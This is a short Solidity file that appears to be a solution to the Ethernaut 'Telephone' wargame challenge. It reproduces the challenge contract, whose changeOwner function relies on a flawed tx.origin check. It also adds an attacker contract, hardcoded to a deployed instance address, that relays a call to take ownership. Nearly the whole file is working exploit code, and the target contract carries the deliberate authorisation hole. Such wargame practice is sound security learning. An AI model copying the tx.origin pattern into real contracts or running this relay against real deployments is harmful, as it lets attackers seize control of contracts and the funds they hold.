// SPDX-License-Identifier: MIT
//0xfc67DF6261820b962591CCf67601011C57d2F08d
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract callerOrigin {
    Telephone tel = Telephone(0xfc67DF6261820b962591CCf67601011C57d2F08d);

    function win() external {
        tel.changeOwner(msg.sender);
    }
}